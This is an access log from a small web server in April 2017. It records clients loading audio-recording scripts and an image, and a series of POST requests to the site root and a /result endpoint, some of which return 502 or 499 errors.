132.205.93.100 - - [10/Apr/2017:00:10:03 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.100 - - [10/Apr/2017:00:10:04 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.100 - - [10/Apr/2017:00:10:04 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.100 - - [10/Apr/2017:00:10:04 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.100 - - [10/Apr/2017:00:10:35 +0000] "POST / HTTP/1.1" 502 181 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:00:10:35 +0000] "POST /result HTTP/1.1" 499 0 "-" "python-requests/2.13.0"
132.205.93.100 - - [10/Apr/2017:00:15:17 +0000] "GET / HTTP/1.1" 200 2291 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.100 - - [10/Apr/2017:00:15:48 +0000] "POST / HTTP/1.1" 502 181 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:00:15:48 +0000] "POST /result HTTP/1.1" 499 0 "-" "python-requests/2.13.0"
132.205.93.100 - - [10/Apr/2017:00:17:11 +0000] "GET / HTTP/1.1" 200 2290 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:00:17:16 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
132.205.93.100 - - [10/Apr/2017:00:17:16 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:00:17:34 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
132.205.93.100 - - [10/Apr/2017:00:17:35 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:00:17:40 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
132.205.93.100 - - [10/Apr/2017:00:17:41 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:00:19:41 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
132.205.93.100 - - [10/Apr/2017:00:19:42 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:00:38:34 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
132.205.228.208 - - [10/Apr/2017:00:38:34 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
132.205.228.208 - - [10/Apr/2017:00:38:35 +0000] "GET /static/js/recorder.js HTTP/1.1" 200 13027 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
132.205.228.208 - - [10/Apr/2017:00:38:35 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 211664 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
132.205.229.75 - - [10/Apr/2017:00:48:16 +0000] "POST /result HTTP/1.1" 200 29 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
